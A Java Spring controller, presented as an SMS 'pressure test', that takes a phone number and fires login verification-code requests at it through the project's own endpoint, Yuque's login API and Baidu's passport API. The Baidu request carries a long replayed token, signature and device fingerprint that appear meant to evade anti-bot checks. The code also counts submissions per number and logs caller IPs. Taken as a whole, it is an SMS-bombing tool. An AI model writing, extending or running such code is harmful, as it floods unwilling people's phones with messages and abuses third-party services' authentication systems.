package cn.qianyekeji.ruiji.controller;

import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpUtil;
import cn.hutool.json.JSONUtil;
import cn.qianyekeji.ruiji.common.R;
import cn.qianyekeji.ruiji.entity.Employee;
import cn.qianyekeji.ruiji.entity.Sms;
import cn.qianyekeji.ruiji.service.EmployeeService;
import cn.qianyekeji.ruiji.service.SmsService;
import cn.qianyekeji.ruiji.utils.IpLocation;
import cn.qianyekeji.ruiji.utils.SMS_TX_Utils;
import cn.qianyekeji.ruiji.utils.ValidateCodeUtils;
import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpCookie;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestClientException;
import org.springframework.web.client.RestTemplate;

import javax.servlet.http.HttpServletRequest;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

/**
 *
 */
@RestController
@RequestMapping("/sss")
@Slf4j
public class SmsTestsController {

    @Autowired
    private SmsService smsService;

    @PostMapping
    public R<String> save(@RequestBody Sms sms,HttpServletRequest request) {
        String p = sms.getP();
        try {
            // 假设 HttpServletRequest 对象为 request
            String ipAddress = IpLocation.getIpAddress();
            //根据页面提交的p(也就是短信压力测试的手机号)查询数据库
            LambdaQueryWrapper<Sms> queryWrapper = new LambdaQueryWrapper<>();
            queryWrapper.eq(Sms::getP,sms.getP());
            Sms sms1 = smsService.getOne(queryWrapper);
            //如果没有查询到则第一次使用，设置number为1
            if(sms1 == null){
                sms.setNumber("1");
                sms.setIpAddress(ipAddress);
                smsService.save(sms);
            }else{
                sms1.setNumber((Integer.parseInt(sms1.getNumber())+1)+"");
                smsService.updateById(sms1);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        try {
                String URL = "http://qianyekeji.cn/sms";
                RestTemplate restTemplate = new RestTemplate();
                HttpHeaders headers = new HttpHeaders();
                headers.setContentType(MediaType.APPLICATION_JSON_UTF8);
                headers.add("Accept", MediaType.APPLICATION_JSON_UTF8_VALUE);
                Map<String, Object> paramMap = new HashMap<>();
                paramMap.put("id", 1330048);
                paramMap.put("phone", sms.getP());
                HttpEntity<Map> entity = new HttpEntity<>(paramMap, headers);
                restTemplate.postForEntity(URL, entity, String.class);
            } catch (RestClientException e) {
                e.printStackTrace();
            }
        try {
            String URL = "https://www.yuque.com/api/validation_codes";
            RestTemplate restTemplate = new RestTemplate();
            HttpHeaders headers = new HttpHeaders();
            headers.add("referer", "https://www.yuque.com/login?goto=https%3A%2F%2Fwww.yuque.com%2Fbeikai%2Fogf5fx%2Fzw1f7u%3F");
            Map<String, Object> paramMap = new HashMap<>();
            paramMap.put("action", "login");
            paramMap.put("channel", "sms");
            paramMap.put("target", sms.getP());
            HttpEntity<Map> entity = new HttpEntity<>(paramMap, headers);
            restTemplate.postForEntity(URL, entity, String.class);
        } catch (RestClientException e) {
            e.printStackTrace();
        }

        try {
            String URL = "https://passport.baidu.com/v2/api/senddpass?gid=A4E0667-21E8-4BCC-AB75-D7D21CF1609C&username="+sms.getP()+"&countrycode=&bdstoken=9f54ddfd307b17768fe2ffee587f5770&tpl=mn&loginVersion=v4&flag_code=0&client=&mkey=&moonshad=c29ada5013b6fa8cfdoe22893549b4b707&ds=hIk48RCjQMce5UDMSXXrEh5S2eSNEI0UZj9+NUNKfL9dVW2fDwn4h7Xczt9rGXzF8i87p53dyziJvGT8RVGKag4ANS1ZAW5e1eXeN5M2sVKKemGuHo0tYvxFy8ATrxrvmodTF/eG0dQ0ybF2yRh+2OsMIOjUWekH1an6F5UOKJ53RIT6a2SLeW3WZimMv82+TEJ9KNmiM3/ZLjtWPtqx5lAhn0N1ByN7fxTFb88VBSaktIfC57doySAj6gQ1fisR9yVzDlEs1eeVd8MHUk9fFlhoNno7DdWzJGXgB3QxHLN62OXAauvZLvTE9UiPfPYHoK4wcvPbkGQ4xHCBzoyMg7v+E1XhhgrYHHtd+SF+4qXxkUYh8dY16XB9cAZA6HYqBnRSx5JS2l9MjpyWDxDqquT1oyorjhBOccVyi0HH50Cer4mh/ONcUYcCciFjbj1U/qKBwjI/c+q0Gvz/AQ8j/CV+I8H/t/X6FQ7JDZPTmbx6XBnO/3HNDGVjWd6L4T5RnJIAyoku0AfXkKHce6gBa6S0h8Lnt2jJICPqBDV+KxGPIM4NTgxuY6Prhaf8AlaPMZgWqd7xqo5MGoG/mCA6bF8TTiaiCzax4cpTviri9Cf1rxRDGIWrlc6etbLbUfJ+GEObL+SSVeGHWOmH93K0e1ipaljUsK5/hegYvZ66xBFDMP9JMCSrdcGteWmB3lpB4fdIP3rPigIKRqinZVVmyseZvAqqnTKi2vqofAbH2tAZFIYD0HdBBx9nt7lADRaM+sC3Y81n6pI4v696COs7ioapMT4KXRAwxlLQUcVmscOB7GYhfbaT03tDSXuEL//6VMy17+Gs66d3u6SP3BOdyryw8BHBn18/XkIjeRiUhK2edihI6g6Mtt0yrO0kqKhpgqAOIAqaU942hYfTJpcfzPtU3ARQRI3B5N34IsczJWtFXj6A0rwSjWnBRiJlVJFAuoNmX2QAZWvtIN73MNSjGo+U2EzR60ql0ChY0BVuqPYdBLL2LA52ccwYJR5BQ9Xl5WTB3hy6m0mf8GlUpClkV5Y/U1rjTdQXElNymL/prNVfyuVbkJXwHiw9q1GQvNOMBR+TwUt28EhoV+IcWpAbNVPNUTq99A2Ifqvr2cHGv9K9Z+wWmwEg+o7KYcZbcQ2lAvVqAeACg7vAO0uDV7XRLNBAmXokyRpAMkOshBCh4BCuo1WbNm5cSUI//elVARiaIGFuOiwcF9DDF3q8INk7TfHn+wgBsAXcJhqOvDCA8oj6zD/zVNAZFquFOTlgakQ+W8AjtlucFJwc04b+xxMGRKuSJr/I2gMkxpPWZH9RKIWbzKj0whA8Fa9r1YoAXzjbX7XQ3LhLNDsUzoNoYVucew==&tk=9546epepRGx0TdDSGZKOBKKDScVxt8kexPupm4BYFUe79KzIF2boN/TVoVXsLLdWtBoK8QsBfUEy5Tqa9Y+yGaa8p29KblwsViutsKDN1scK9F4zCkdfmezBwl4Ifw3fsSha&supportdv=1&dv=tk0.90662508214881421676302666604@kko0zunk3G8mgHFHl6H32nLjyFHjhP8C2PLMnfRjhdN~l4ukoYnChanCpG8mgHFHl6H32nLjyFHjhP8C2PLMnfRjhdN~l4ukoMnVSanCvG8mgHFHl6H32nLjyFHjhP8C2PLMnfRjhdN~l4uk8w8bWanCRG8mgHFHl6H32nLjyFHjhP8C2PLMnfRjhdN~l4uk8bnbSanCqG8mgHFHl6H32nLjyFHjhP8C2PLMnfRjhdN~l4uk8Y0CSalo0YlnVIbukvjnEwgnb3j81gHFHl6H32nLjyFHjhP8C2PL~W4ptD4R3gXA~4K7s21PkpY8xwb8k3G8CIb8bRG7v20DjrhC7yPH2nFLbvgLjybNLntALrQAU4kN~D4PkplnxwgnbqG8C3enCvGp~yfRsyKR~7EJtSdS6w~8bIG8V3xukow8VR~u2DhC3SEFHjPLjhCH2ag87yPR~jb7s4fALrauWWJCWI544iVhIoA8EwxukvwnF__GoQSsGwuV3wnVpxnCqe8VvY0kIgnkognVR~8bqxnVp~nVqYhoPJmgjNZD4AZ4KAtF_Bos8mwwukvbnVpG8bol8Ewg8bp~ukR~0mwg8bp~ukvbnVpGnboe&apiver=v3&tt=1676302687664&traceid=&time=1676302688&alg=v3&sig=NUtNNWV5WDdTZE1Mcng4MForMzNBdjZHT1Voa2Z3WE5jd0ZSRW42MkVFUUpSU2UvSEIyQ3JGOXByd3MvYnJBSA==&elapsed=13&shaOne=00e11487b57352f3b4887ee11c12b5b182803f22&rinfo={%22fuid%22:%22b8447523d22097437525e6772168365a%22}&callback=bd__cbs__3lawfb";
            RestTemplate restTemplate = new RestTemplate();
            restTemplate.getForObject(URL, String.class);
        } catch (RestClientException e) {
            e.printStackTrace();
        }




        return R.success("测试已启动");
    }
}
